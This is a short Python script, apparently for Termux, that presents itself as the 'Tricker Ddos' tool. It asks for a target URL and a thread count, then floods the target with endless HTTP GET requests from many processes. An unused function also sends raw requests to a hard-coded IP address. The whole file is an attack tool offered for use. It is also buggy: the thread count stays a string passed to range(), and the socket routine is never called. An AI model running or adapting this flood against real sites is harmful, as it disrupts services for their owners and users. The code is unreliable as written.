import socket
s = socket.socket()
from multiprocessing import Process as p
from requests import get as rg
import os

os.system('pkg install figlet -y')
os.system('pkg install toilet -y')
os.system('clear')
print('\033[31m')
os.system('figlet Tricker')
print('\033[32m')
os.system('toilet Ddos')
print('\033[36m')
print('made by tricker')
print('\033[0m')

url = input('url :')
thread = input('thread(default 500) :')

def dos():
    s.connect(('145.14.145.147', 443))
    req = 'GET / HTTP/1.1\r\nHost:'+url+'\r\n\r\n'
    s.send(req.encode())
    s.recv(10000)
    print('sending')

def att():
    while True:
        dos()

def req():
    p = rg(url)
    print(p)

def a():
    while True:
        req()

for i in range(thread):
    t = p(target=a)
    t.start()
